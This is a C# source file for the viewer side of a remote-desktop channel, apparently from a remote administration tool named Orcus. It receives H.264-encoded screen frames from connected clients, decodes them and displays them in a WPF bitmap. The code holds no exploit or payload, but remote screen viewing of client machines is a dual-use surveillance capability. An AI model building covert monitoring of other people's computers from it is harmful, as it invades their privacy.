using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using OpenH264Lib;
using Orcus.Administration.Library.Channels;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Services;
using RemoteDesktop.Administration.Rest;

namespace RemoteDesktop.Administration.Channels
{
    public class RemoteDesktopChannel : ChannelBase, INotifyPropertyChanged
    {
        private readonly IAppDispatcher _dispatcher;
        private Decoder _decoder;

        public RemoteDesktopChannel(IAppDispatcher dispatcher)
        {
            _dispatcher = dispatcher;
        }

        public WriteableBitmap Image { get; private set; }

        public Task StartRecording(IPackageRestClient restClient)
        {
            _decoder = new Decoder(@"F:\Projects\Orcus\src\modules\RemoteDesktop\test\RemoteDesktop.TestApp\bin\Debug\openh264-1.8.0-win32.dll");
            return RemoteDesktopResource.StartScreenChannel(this, restClient);
        }

        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

        protected override unsafe void ReceiveData(byte[] buffer, int offset, int count)
        {
            Bitmap bitmap;
            fixed (byte* bufferPtr = buffer)
            {
                bitmap = _decoder.Decode(bufferPtr + offset, count);
            }

            _dispatcher.Current.BeginInvoke(new Action(() =>
            {
                using (bitmap)
                {
                    var notifyUpdateImage = false;
                    if (Image == null)
                    {
                        Image = new WriteableBitmap(bitmap.Width, bitmap.Height, 96, 96, PixelFormats.Rgb24, null);
                        notifyUpdateImage = true;
                    }

                    Image.Lock();
                    var lockBits = bitmap.LockBits(new Rectangle(System.Drawing.Point.Empty, bitmap.Size), ImageLockMode.ReadOnly, bitmap.PixelFormat);
                    try
                    {
                        memcpy(Image.BackBuffer, lockBits.Scan0, (UIntPtr) (lockBits.Stride * lockBits.Height));

                        Image.AddDirtyRect(new Int32Rect(0, 0, lockBits.Width, lockBits.Height));
                    }
                    finally
                    {
                        bitmap.UnlockBits(lockBits);
                        Image.Unlock();
                    }

                    if (notifyUpdateImage)
                        OnPropertyChanged(nameof(Image));
                }
            }));
        }

        protected override void InternalDispose()
        {
            base.InternalDispose();
            _decoder?.Dispose();
        }

        public event PropertyChangedEventHandler PropertyChanged;

        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}